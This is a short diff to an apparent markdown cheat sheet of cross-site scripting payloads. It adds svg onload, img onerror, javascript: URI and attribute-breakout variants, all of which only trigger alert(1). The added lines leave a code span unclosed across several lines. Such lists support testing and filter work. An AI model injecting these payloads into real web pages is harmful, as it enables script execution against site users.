@@ -2,7 +2,13 @@
 
 ### Script Injection
 - `<script>alert(1)</script>`
-- `<script src=javascript:alert(1)>`
+- `<script src=javascript:alert(1)>
+- "><svg onload=alert(1)>
+- <img src=1 onerror=alert(1)>
+- javascript:alert(1)
+
+"onmouseover="alert(1)
+javascript:alert(1)`
 
 ### Event Handlers
 - `onmouseover=alert(1)`
